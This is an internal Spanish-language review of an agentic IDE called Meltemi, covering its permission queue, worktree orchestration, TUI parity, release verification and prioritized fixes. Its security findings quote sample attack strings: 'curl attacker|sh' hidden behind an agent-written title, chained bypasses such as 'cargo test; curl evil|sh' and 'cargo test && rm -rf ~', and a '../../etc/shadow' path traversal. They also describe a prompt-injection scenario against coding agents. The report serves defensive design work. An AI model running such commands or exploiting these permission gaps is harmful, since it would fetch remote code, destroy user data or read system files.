# De producto sólido a IDE agéntico de clase mundial

> Revisión completa del 2026-07-28, encargada por el mantenedor. Método: ocho
> revisores en paralelo sobre siete dimensiones (GUI, TUI/CLI, núcleo,
> mercado, open source, seguridad, calidad de ingeniería) más un crítico de
> completitud, con la evidencia conducida de las dos sesiones previas
> (auditoría CDP de la GUI, cuatro defectos de acabado corregidos, los tres
> prerrequisitos del Agent Boss implementados).
> **Documento interno de research**: no es una change ni compromete el plan;
> es materia prima para decidir el orden.

## Veredicto

Meltemi ya es un producto **serio y honesto**, con dos o tres propiedades que
ningún competidor tiene. Lo que le falta para «clase mundial para todos» no es
sofisticación: es **cerrar bucles que hoy terminan a medio camino**. El patrón
se repite en las siete dimensiones — hay una arquitectura excelente detrás de
una superficie que no la explota del todo:

- La cola de permisos es de las mejores que he leído en un producto de esta
  categoría… y decide sobre un título que escribe el propio agente.
- El ciclo `implement` orquesta checkpoint→turno→commit→tick con
  trazabilidad… y deja el trabajo en ramas técnicas que nada integra.
- La paridad ×3 es un gate de CI que no se puede falsear… y la TUI, superficie
  de la persona #1 del rumbo, tiene 24 de 34 verbos anunciados como
  «reservado».
- La verificación de releases se explica en tres niveles con honestidad
  ejemplar… y la clave pública para ejecutar el nivel 2 no está publicada.

Ese es el informe entero en cuatro líneas. Lo que sigue lo desarrolla con
evidencia y especificación.

---

## Calibración: lo que ya está por encima de la vara

No para adular — para no romperlo al mejorar lo demás.

1. **La frontera de red es una propiedad verificable por máquina.**
   `deny.toml:62-109` prohíbe `reqwest`/`hyper`/`rustls`/`openssl`/`ureq`… con
   la excepción de `tauri` argumentada en el propio archivo. Convertir un
   principio constitucional en un gate de CI que falla es rarísimo.
2. **La espera humana de permisos.** Cola global que sobrevive reconexiones,
   push cuyo fallo no resuelve nada, first-wins auditado, denegación
   constitucional tras gracia. Con procedencia (regla/humano/vencimiento) en
   cada decisión.
3. **La honestidad como sistema, no como eslogan.** «No reportado por el
   protocolo» en vez de ceros; alcance irreversible declarado en el revert;
   truncado del mapa declarado en el propio resultado; marca de corte en el
   transcript al caer el daemon. Es el activo de marca más difícil de copiar.
4. **El dogfooding demostrable.** ~50 changes archivadas con deltas foldeados
   a una verdad viva de 35 capacidades. Ningún «spec mode» comercial puede
   exhibir eso.
5. **Aislamiento no invasivo.** Checkpoints en `refs/meltemi/` vía scratch
   index que no toca el índice del usuario ni mueve ninguna rama suya.

---

## P0 — los seis que bloquean

Ordenados por daño. Los tres primeros los **verifiqué yo mismo en el código**
antes de firmarlos.

### P0-1. El permiso se decide sobre un texto que escribe el agente

- **Evidencia**: `core/meltemid/src/acp.rs:463-467` — `summary` sale de
  `tool_call["title"]`, texto libre del agente. `pending.rs:107-108` — el
  daemon **tiene** el comando y nunca lo serializa. `proto/…/lib.rs`
  (`PendingPermission`) no lleva `command` ni `path`. Render:
  `Permissions.svelte:59`, `tui/…/render.rs:884-889`.
- **Por qué es P0**: es la superficie donde la inyección de prompt se
  materializa. Un agente comprometido titula «Read README.md» mientras el
  comando real es `curl attacker|sh`, y ambas superficies muestran el título.
  La única defensa documentada (§8.4, registro auditable) ocurre *después*
  del clic. Peor: `permissions.rs:74-98` ya calcula `is_out_of_tree()` — la
  materia prima de la mitigación existe y no llega a la pantalla.
- **Especificación**: capability `permission-rules` (+ paridad ×3).
  Campos aditivos en `PendingPermission`: `command`, `path`,
  `outOfTree: bool`, y `summary` rotulado explícitamente como **declarado por
  el agente**. Requisito nuevo: *«El resumen lo escribe el agente; el hecho lo
  escribe el daemon. Toda superficie SHALL mostrar el comando y la ruta
  literales junto al resumen, sin truncar por debajo de una línea completa, y
  SHALL rotular el resumen como texto del agente. Una petición fuera-del-árbol
  SHALL rotularse irreversible por checkpoint.»*
- **Done**: escenario «El resumen que miente no oculta el comando» con un tool
  call cuyo `title` contradice `rawInput.command`, verificado en test de
  daemon + render TUI + smoke visual GUI.
- **Urgencia adicional**: `lanzador-conversacional` (activa) renderiza tarjetas
  de permiso en línea reutilizando «misma cola, mismos RPC» — si esto no se
  arregla antes, la change cimenta la pobreza en la superficie nueva.

### P0-2. `allow` por prefijo de comando es allow-all bajo encadenamiento

- **Evidencia verificada**: `core/meltemid/src/permissions.rs:205-211` —
  `c.starts_with(prefix)` textual, sin tokenización. Y la regla anti-fatiga se
  genera con el comando entero como prefijo (`pending.rs:330-336`), así que el
  usuario que aprueba `cargo test` tres veces **persiste ese prefijo**.
- **Por qué es P0**: `cargo test; curl evil|sh`, `cargo test && rm -rf ~`,
  `` cargo test `id` `` empiezan todos por `cargo test` → allow silencioso, sin
  escalar. Es la clase de fallo que ya quemó a otros orquestadores.
- **Especificación**: capability `permission-rules`, requisito *«Prefijo de
  comando con frontera y sin composición»*: (a) coincidencia en frontera de
  token (`cargo test` cubre `cargo test --all`, no `cargo testx`); (b) un
  comando que contenga `;`, `&&`, `||`, `|`, `` ` ``, `$(`, `>`, `>>`, `<`,
  salto de línea o sustitución **SHALL escalar al humano aunque una regla
  `allow` coincida** — los `deny` siguen aplicando; (c) el diagnóstico nombra
  el metacaracter que forzó la escalada.
- **Done**: escenarios «Composición rompe el allow» y «Frontera de token» con
  tests tabulares sobre la lista de metacaracteres, más un test que fija que
  `deny` no se debilita.

### P0-3. `implement` no integra: las tareas dependientes fallan siempre

- **Evidencia verificada**: `core/meltemid/src/server.rs:1525` —
  `let base = head_rev(&root)` se fija **una vez** antes del bucle; `:1564` —
  cada worktree de tarea nace de esa misma base; `:1629-1650` — el commit queda
  en `meltemi/<change>/<task>-<agent>` y **nada lo integra**. La spec
  `implement-command` no menciona integración.
- **Por qué es P0**: la tarea 2.1 que usa el código de la 1.1 no lo ve, nunca.
  Y al terminar, `tasks.md` queda ticked en el root mientras el branch del
  usuario no contiene ni una línea del trabajo. El bucle central del producto
  no aterriza.
- **Especificación**: change sobre `implement-command` + `worktree-orchestration`.
  (a) En implement secuencial, la base avanza: el worktree de la tarea *k* nace
  del commit de la tarea *k−1* (fast-forward de la rama técnica de la change), o
  se reutiliza **un** worktree por change; (b) verbo de cierre
  `worktree/integrate` (o paso final de implement) que hace fast-forward/merge
  al branch del usuario con confirmación explícita y reporte honesto de
  conflictos, componible con el merge asistido de carreras.
- **Done**: escenario «tarea dependiente ve el trabajo de la anterior» +
  «al integrar, HEAD del usuario contiene los commits por tarea con sus
  trailers», verdes con mock-agent; paridad ×3 documentada.

### P0-4. La TUI no puede pilotar el método: 24 de 34 verbos «reservados»

- **Evidencia**: `tui/src/shell/palette.rs:97-289` (`reserved: true` en propose,
  gate, review, implement, verify, archive, validate, usage, changes,
  worktrees, assign, race, dispatch, commit, revert, direct, map…);
  `state.rs:312-359` (el reducer solo ejecuta shutdown/quit/status/projects/
  sessions/project/fleet); `render.rs:826` («coming soon»).
  Y `docs/paridad-nucleo.md:36-40`: `sdd/gate`, `sdd/review-decide` y
  `sdd/verify-mark` tienen «—» en la columna CLI.
- **Por qué es P0**: la persona #1 del MVP es el dev de terminal, y hoy no
  puede ejecutar ni **decidir** el método sin salir a la GUI. El gate de
  paridad pasa (los métodos tienen «hogar» registral) mientras la paridad real
  no existe. El lema del producto es falso para su público primario.
- **Especificación**: dos deltas coordinados.
  (a) `cli-contract`: `meltemi gate <change> <artifact> approve|reject`,
  `meltemi review <change> decide <item> …`, `meltemi verify <change> mark …`,
  `meltemi log <session> [--follow]`, `meltemi cancel <session> [confirm]` —
  subverbos sobre RPC existentes, con el preview/confirm ya establecido.
  (b) `tui-shell`: la paleta acepta `verbo args…` con la misma gramática del
  CLI (reutilizando `cli::plan_subcommand`, que ya es puro) y muestra el render
  humano existente en un panel desplazable; los verbos con confirm reutilizan
  `Overlay::Confirm`.
- **Done**: ninguna `Entry` queda `reserved: true` salvo las que exijan stdin;
  la columna CLI de la matriz pierde sus «—»; el string «(reservado)»
  desaparece del render para verbos operativos.

### P0-5. La verificación prometida es inejecutable, y el quickstart empieza en `cargo`

- **Evidencia**: `docs/release.md:88-91` declara en negrita que **el paso 2 no
  lo puede completar un lector hoy** (la clave pública minisign no está en el
  árbol) mientras `README.md:69-73` promete los tres niveles. Y
  `docs/quickstart.md:8-17` arranca compilando desde fuente, contradiciendo los
  instaladores firmados que el README recomienda.
- **Por qué es P0**: es el minuto uno del embudo, y es lo más urgente en
  tiempo-calendario porque el anuncio está cerca. Toda la sofisticación de
  verificación es marketing hasta que un lector pueda ejecutar el paso 2.
- **Especificación**: (a) publicar `minisign.pub` en el árbol, retirar el aviso
  de `release.md`, y un lint que verifique que la clave citada coincide con el
  archivo (encaja en `procedencia-de-release`, activa, si su tasks lo cubre);
  (b) delta sobre `initial-docs`: quickstart paso 1 = instalar desde release,
  «desde fuente» como alternativa, y el paso de agente basado en
  `meltemi fleet` y su remedio por capa en vez de editar TOML a mano.
- **Done**: un lector completa los pasos 1-3 tal como están escritos, y el
  recorrido instalador→primera propuesta no toca `cargo`.

### P0-6. El smoke visual conducido no es un gate

- **Evidencia**: `docs/qa/2026-07-26-gui-acabado-smoke.md:34-38` — «el smoke es
  manual y por release… queda apuntado como change futura». Los **cuatro**
  defectos de `gui-acabado-y-cierre-sdd` y el apilado de botones de
  `pulido-pre-anuncio` fueron invisibles a todos los tests de cableado: cinco
  defectos reales que solo el método conducido atrapó.
- **Por qué es P0**: sin gate, el próximo regression visual espera a la próxima
  corrida manual del mantenedor. Y el incidente del `cargo build --release`
  (binario que compila y cuya ventana no carga la UI) demuestra que la clase
  «empaquetado correcto, producto roto» ya ocurrió una vez.
- **Especificación**: capability nueva `gui-smoke-conducido`.
  (1) Promover el driver a `desktop/qa/driven-smoke.mjs` versionado;
  (2) overlay `desktop/tauri.smoke.conf.json` con el puerto de depuración,
  usado **solo** vía `tauri build --no-bundle --config` en el job de smoke —
  con un wiring-test que afirma que `tauri.conf.json` base **no** contiene
  `remote-debugging` (el binario publicado jamás lo lleva);
  (3) job `smoke-gui (windows-latest)` que construye con overlay, lanza contra
  fixture temporal con mock-agent y afirma las invariantes ya establecidas
  (main ocupa el alto disponible, filas de árbol ≥ line-height, `.git` ausente
  del mapa, botones en una línea);
  (4) Linux en segunda etapa (WebKitGTK no habla CDP; la vía es tauri-driver
  bajo xvfb) — documentado como tarea aparte, sin bloquear el gate de Windows.
- **Done**: un PR que rompa una invariante de layout pone CI en rojo sin
  intervención humana.

---

## P1 — lo que separa «funciona» de «clase mundial»

### Núcleo y contrato

| # | Hallazgo | Evidencia | Especificación (resumen) |
|---|---|---|---|
| N1 | **MCP nunca llega a agentes stdio** (el caso base) | `mcp.rs:17-19`: `announces_mcp = caps.http \|\| caps.sse`; ACP no declara flag para stdio porque es la línea base | La compuerta pasa a ser **por transporte del servidor**: los `Stdio` se inyectan siempre; los `Http` solo con `caps.http`, y su no-entrega se registra por servidor. Test: handshake sin capacidades MCP → los stdio SÍ viajan |
| N2 | **`change/list` escanea todo el código en cada listado** | `verify.rs:100-121` (walk + `read_to_string` de cada `.rs`) invocado por `navigate.rs:171` en cada `change/list` | Caché en memoria keyed por `(path, mtime, len)`; releer solo lo cambiado. Sin RPC nuevo. Done: segundo listado no relee archivos intactos |
| N3 | **`session/list` relee todos los JSONL de todos los proyectos** | `session_index.rs:113-119`: `rebuild_from_logs` corre **incondicionalmente** en cada `records_for_project` | Rebuild solo si el índice falta/está dañado + reconciliación barata por diferencia de nombres de archivo (un `.jsonl` sin entrada dispara el fold de *ese* log) |
| N4 | **Merge asistido sin borrados ni hunk-level** | `worktrees.rs:184-205`: `apply_file` es copia verbatim; un archivo **borrado** por el ganador no es representable | `apply_file` soporta delete; verbo `worktree/merge-competitor` que aplica el conjunto completo vía git con conflictos declarados. Hunk-level queda para la GUI sobre `apply-edit` |
| N5 | **Forma canónica de los RPC largos** (deuda ya declarada) | `server.rs:1599-1622` (implement), `:749-772` (dispatch): N turnos dentro de una request | Param aditivo `detach: true` → retorno inmediato `{sessionId}`, progreso por `session/watch`, resultado terminal como evento tipado recuperable de `session/log`. La forma síncrona se conserva (promesa de «pasos scriptables») |

### Seguridad

| # | Hallazgo | Evidencia | Especificación (resumen) |
|---|---|---|---|
| S1 | **Matchers evadibles; el `deny` no falla cerrado** | `permissions.rs:213-217` (`p.starts_with` sobre ruta cruda: `/repo/src/../../etc/shadow` casa `allow "/repo/src"`; en Windows la comparación es sensible a mayúsculas); `:46` (`tool = kind.or(title)`: el agente elige el matcher con texto libre) | Normalización léxica de rutas (resolver `..`, unificar separadores, case-fold en Windows); el matcher `tool` lee **solo** `toolCall.kind`; requisito *«El deny falla cerrado»*: un `deny` cuyo hecho requerido está ausente escala al humano |
| S2 | **Contención rota en Windows** | `server.rs:870` y `worktrees.rs:194` guardan con `file.contains("..") \|\| is_absolute()`. En Windows `Path::new("/Windows/System32/x").is_absolute() == false` y `join` con esa ruta **escapa del árbol**. Sin resolución de symlinks | Extraer `fn contained_path(tree, rel) -> Result<PathBuf, Refusal>` única: rechaza componentes `Prefix`/`RootDir`/`ParentDir`, canonicaliza y verifica contención. Tabla de casos maliciosos ejecutada en los 3 SO |
| S3 | **Lint de secretos muerto en URLs; dos políticas distintas** | `config.rs:491-505`: la rama «opaca» exige que **todos** los caracteres sean alfanuméricos o `-_./+=` → una URL contiene `:` y nunca dispara. Un perfil con secreto se **rechaza**; un MCP solo se **advierte** y se lanza igual | Detector que examine dentro de URLs (query, userinfo); lintear `args`, `command` y `url`; **una sola política**: literal-que-parece-secreto ⇒ rechazo con remedio `${VAR}`. Además: el JSONL de sesión guarda el tool call íntegro y se crea con la umask — endurecer a `0600`/`0700` y redactar el evento |
| S4 | **Sin contención mínima mientras `sandbox-propio` no exista** | `acp.rs:145-160`: el agente hereda **el entorno completo** del daemon — todo `GITHUB_TOKEN`, `AWS_*`, `ANTHROPIC_API_KEY` del usuario llega a cada agente de la flota | Change `contencion-minima`: (1) allowlist de entorno declarada (`PATH`, `HOME`, locale + lo que el perfil declare), heredar-todo como opt-in con diagnóstico; (2) rótulo del aislamiento **real** por agente en `fleet/list` (cumple §8.3, es texto verificado); (3) cota de peticiones fuera-del-árbol por turno |

### Superficies

| # | Hallazgo | Especificación (resumen) |
|---|---|---|
| G1 | **Revisión de diffs por debajo de la vara** (`Review.svelte:93-132`: parser propio, sin gutter viejo, sin resaltado, sin colapso, sin virtualización) | Change `revision-diffs-clase-mundial`: gutter dual old/new, resaltado por CM6 en lectura, colapso por archivo con stats +/−, navegación por teclado, render perezoso. Relación declarada con `lsp-superficie-revision` (que es inteligencia, no ergonomía) |
| G2 | **La sesión libre no tendrá superficie de revisión** — hueco que `lanzador-conversacional` crea: su D2 decide que opera en la **raíz**, y `Review.svelte` solo consume `worktree/*` | Capability `session-diff`: RPC aditivo `session/diff {sessionId}` contra el punto de restauración declarado (el daemon ya conoce el checkpoint; git local, §3 intacto). Paridad ×3. **Es la pregunta central del Agent Boss: «¿qué cambió esta sesión?»** |
| G3 | **Aviso nativo del SO cuando un permiso espera** — con `espera-humana`, una petición aguarda indefinidamente y el flash de taskbar es invisible en pantalla completa | Delta `gui-shell`: plugin oficial de notificación de Tauri (cliente, no daemon), disparado por el mismo evento que alimenta `request_attention`, con opt-out en Ajustes. No choca con «sin push sin túnel»: es local, con la app corriendo |
| T1 | **Modo scriptable degradado**: todo permiso se auto-deniega (`run.rs:156-178`), `--autonomous` inalcanzable (`:662` hardcodea `false`), y los exit codes 12/13 nunca se emiten | `cli-contract` + `permission-rules`: `--autonomous`; `meltemi permissions [decide]` para operar desde otra terminal; exit 12 cuando denegaciones dejaron el turno incompleto |
| T2 | **La TUI no tiene analítica** (`state.rs:13-42`: sin vista; la GUI y el CLI sí) | `tui-shell`: vista 5 reutilizando `render_usage` adaptado a ratatui, o como mínimo el verbo operativo en la paleta (cae dentro de P0-4) |
| O1 | **Sin modo demo: el primer wow exige agente instalado** (`README.md:215` «Meltemi ships no agents»; `mock-agent` existe pero no se empaqueta) | Capability `demo-tour`: `meltemi demo` (paridad ×3) que corre propose→review→implement contra un agente **simulado** sobre un repo fixture temporal, etiquetado «simulado» en toda superficie. **Requiere enmendar el claim público**, ver Tensión 3 |
| O2 | **Sin gestores de paquetes** (`winget`/`brew`/`scoop`: 0 resultados en el repo) | Change `distribucion-gestores-paquetes`: manifiestos winget + tap Homebrew + bucket Scoop generados por el workflow de release desde los assets firmados. No toca el daemon |
| O3 | **Sin canal de comunidad ni plantillas de bug** (solo existe `change-proposal.md`) | `community-governance`: habilitar Discussions, plantillas bug/pregunta, y decidir por escrito sí/no chat y FUNDING — aunque la decisión sea «no por ahora», como hace todo lo demás en este repo |
| M1 | **Imagen/screenshot al agente** — `instruction` es string plano; ACP ya define `ContentBlock` de imagen | `acp-session` + `session-history`: bloques tipados aditivos (text \| image); el daemon releva sin interpretar (§5) y degrada con error estructurado si el agente no declara la capacidad — nunca en silencio. GUI pega del portapapeles; TUI/CLI `--attach`. **Es la única apuesta de mesa 2026 universal, barata y visible en toda demo comparativa** |
| Q1 | **Guardián contra el `cargo-build-trap`** — `desktop/build.rs` es solo `tauri_build::build()`; un `ui/dist` rancio se embebe en silencio | En `build.rs`: fallar con remedio si `ui/dist/index.html` falta; avisar (o fallar bajo CI) si `ui/src` es más nuevo que `ui/dist`; `rerun-if-changed` en ambos. Wiring-test que afirma que el guardián existe |
| Q2 | **El instalador jamás se instaló y abrió en QA** (`2026-07-25-gui-presupuestos.md:66-68`: verifica emisión, nombre y tamaño; ninguna fila dice «instalado y lanzado») | Job `installer-smoke (windows-latest)`: `msiexec /i /qn`, afirmar el exe en la ruta instalada, lanzarlo, proceso vivo a los 10s, `msiexec /x /qn` limpio. Equivalente `dpkg -i` + xvfb en Linux |
| C1 | **Los formatos persistidos no tienen versión** — `grep version\|migrat` en `session_log.rs`, `session_index.rs`, `config.rs` = 0. El contrato sí versiona; los datos no | Change corta: campo `formatVersion` aditivo en cada JSONL nuevo e índice; política escrita (lee N y N−1, rehúsa con diagnóstico lo que no reconoce, jamás adivina). **Barato ahora, carísimo después del anuncio** |
| C2 | **Windows como host remoto del Agent Boss** — el helper de túnel rehúsa (named pipe no reenviable) y la solución está diferida a fase 3 | Adelantar fuera de `companero-movil`: modo puente del binario ya instalado (`meltemi pipe-stdio`, usable como `ProxyCommand`) que puentea named pipe↔stdio **en la máquina del daemon** — es transporte del cliente ssh, §3 intacto. El claim insignia deja de tener asterisco en la plataforma primaria |

---

## P2 — acabado, ergonomía y sostenibilidad

- **Reglas de permiso sin superficie de gobierno**: se crean a un clic
  (`Permissions.svelte:76-81`) y se revocan editando TOML a mano. RPC aditivo
  `permission/rules` + sección «Reglas vigentes», paridad ×3.
- **Navegación por teclado incompleta**: `role="tree"` sin flechas ni roving
  tabindex (`Sidebar.svelte:151`, `Editor.svelte:477`); el quick open solo abre
  el primer resultado y su `aria-selected` está clavado a `index === 0`.
  Inconsistencia interna: la paleta **sí** navega con flechas.
- **Rendimiento del transcript**: `lines = [...lines, …]` por evento y `{#each}`
  sin virtualización (`SessionDetail.svelte:133-141`). La vista conversacional
  se montará sobre este sustrato.
- **Mapa del repo sin símbolos**: `{path, is_dir, size}` obliga al agente a
  re-derivar la estructura leyendo archivos. Modo `symbols` opt-in con
  presupuesto declarado es de las palancas de contexto más rentables.
- **`@refs` miente con binarios**: `read_to_string(Err)` → «not found», sin
  distinguir «no existe» de «no es texto». Contra el patrón de la casa.
- **Colisión del scratch index de checkpoints**: `index-{task}-{agent}` omite
  el change; dos dispatches de `1.1` en changes distintas se corrompen. Fix
  trivial, escenario plausible en cuanto la orquestación cumpla su promesa.
- **Huérfanos tras `kill -9` del daemon**: `kill on drop` no corre en crash
  duro; agentes reales siguen quemando tokens sin dueño. Job Object en Windows,
  `PR_SET_PDEATHSIG` en Linux, limitación declarada en macOS.
- **Diagnósticos de higiene invisibles**: `fleet_diagnostics` va a
  `tracing::warn!` y muere en el log del daemon. Campo aditivo en `fleet/list`:
  cero lógica nueva, solo transporte.
- **Aserciones negativas tras `sleep` fijo** en e2e: falso-verde en máquina
  lenta. Helper `wait_until(deadline, cond)` + convención escrita.
- **macOS nunca abierto por QA**: compila y se mide el DMG, pero ninguna
  ventana se ha creado jamás. Launch-smoke (montar DMG, `open`, proceso vivo
  a los 10s) atrapa la clase `cargo-build-trap`.
- **`server.rs` a 2 209 líneas** sin criterio de partición escrito. Las cuatro
  changes activas tocarán las mismas líneas.
- **`npm audit` bloqueante en release**: el único gate cuyo resultado cambia
  sin que cambie el repo. Degradar a no bloqueante en release (o `--omit=dev`),
  manteniéndolo en CI.
- **`meltemi doctor`**: sin telemetría (correcto, §9) no hay **ningún**
  mecanismo para aprender de los usuarios. El sustituto honesto es un reporte
  100% local, visible antes de compartir, que la plantilla de bug referencia.
- **Bus factor 1**: clave minisign, DNS, cuentas y crates bajo una sola
  persona, sin sucesión escrita. Para un proyecto que vende confianza
  verificable, la continuidad de esa confianza debería estar en GOVERNANCE.
- **Rampa del contribuidor foráneo**: `arquitectura.md` son 48 líneas, cero
  issues `good first change`, y nada explica cómo un foráneo ejecuta el método
  con la herramienta misma.
- **Demo visual**: dos capturas estáticas, ningún GIF/asciinema del ciclo. El
  procedimiento de captura ya es un script — falta la secuencia animada.

---

## La mesa de apuestas 2026

Lo que la categoría da por sentado, y dónde está Meltemi:

| Apuesta | ¿Existe? | Veredicto |
|---|---|---|
| Imagen/screenshot al agente | No | **P1 alto** — universal, barata (ACP la define), visible en toda comparativa |
| Presupuestos/límites por sesión | Solo `[limits]` del harness propio | P1 — coordinar con `motor-propio-byok` (ver Tensión 2) |
| Memoria persistente por proyecto | No (la proyección son reglas, no aprendizajes) | P1 — `.meltemi/rumbo/aprendizajes.md` alimentado bajo gate humano al archivar |
| Contradicciones semánticas en specs | Diferido con razón escrita | P1 — es «la obsesión» §4.9; deuda sobre el diferenciador central |
| Ventana de contexto / compactación | No | P2 — misma frontera de honestidad que los tokens |
| Preview del app en desarrollo | No | P2 — **vía MCP** (Playwright), jamás motor embebido (§7). Falta la guía verificada |
| Terminal integrada | No | **No** — choca con el no-objetivo #1 |
| Voice input | No | **No** — sin evidencia de demanda en las tres personas |
| Agentes cloud gestionados | No | **No** — contradice «no es servicio en la nube»; el daemon remoto por SSH es la respuesta propia |

---

## Tres tensiones que resolver **antes** de ejecutar

1. **Paridad de capacidad ≠ paridad de experiencia.** El revisor de GUI declara
   el render de diffs «cromo, exento de paridad»; el de TUI exige la vista de
   analítica apelando a §4. Con la regla actual ambos pueden citarla. Antes de
   arbitrar caso por caso, escribir la distinción en `docs/paridad-nucleo.md`:
   qué debe existir en las tres superficies (la **capacidad**) y qué puede
   diferir (la **presentación**).
2. **Dos sistemas de límites.** `motor-propio-byok` introduce `[limits]` en el
   harness; los presupuestos por sesión a nivel de flota son otra cosa. Sin
   coordinación nacen dos semánticas. La change de presupuestos debe declarar
   la relación (el `[limits]` del harness como caso particular, o capas
   explícitas).
3. **«Meltemi ships no agents» vs. modo demo.** El agente simulado embebido
   contradice literalmente el claim del README. Es resoluble — etiquetarlo
   «simulado» en toda superficie, no es un agente real — pero la change debe
   **enmendar el claim público explícitamente**, o el anuncio se contradice.

---

## Orden sugerido

**Ola A — antes del anuncio (días).** P0-5 (clave + quickstart), P0-1 y P0-2
(los dos de permisos: son la promesa nuclear y uno es explotable), Q1
(guardián del build). Todo es pequeño y todo es visible.

**Ola B — el bucle que no cierra (semanas).** P0-3 (implement integra), P0-4
(TUI/CLI de primera clase), P0-6 (smoke como gate) + Q2 (instalador probado).
Aquí es donde «funciona en la demo» pasa a «funciona en el trabajo real».

**Ola C — clase mundial visible.** M1 (imagen al agente), G1 (diffs), G2
(`session/diff` — sin él, `lanzador-conversacional` deja al Agent Boss sin la
respuesta a «¿qué cambió?»), G3 (notificación), S1-S4 (seguridad), N1-N3
(MCP stdio y los dos escaneos).

**Ola D — para todos.** O1 (demo), O2 (gestores de paquetes), O3 (comunidad),
C1 (versión de formatos), C2 (Windows remoto), rampa del contribuidor.

---

## Nota de método y honestidad

- **Verificado por mí en el código**: P0-1, P0-2, P0-3, S3 (los cuatro más
  graves). El resto proviene de los revisores con su cita `archivo:línea`; no
  reproduje cada uno.
- **Excluido deliberadamente**: todo lo cubierto por las changes activas
  (`lanzador-conversacional`, `adaptadores-propios-acp`, `motor-propio-byok`,
  `procedencia-de-release`) y por el backlog declarado de fase 2 (`hooks`,
  `plugins-skills-sdk`, `i18n-superficies`, `metricas-sdd-locales`,
  `lsp-superficie-revision`, `sandbox-propio`). Donde propongo algo adyacente,
  lo digo.
- **Sesgo declarado**: conduje la GUI dos veces con CDP y encontré cinco
  defectos que ningún test veía. Eso me hace pesar más los hallazgos de
  verificación conducida (P0-6, Q1, Q2) de lo que un revisor puramente
  documental los pesaría. Creo que el sesgo está justificado por la evidencia,
  pero conviene saberlo al leer.
- **Lo que este informe no cubre**: no evalué el motor de specs por dentro
  (parsing EARS, merge de deltas) ni la calidad del código Svelte más allá de
  lo que la revisión de superficie tocó.
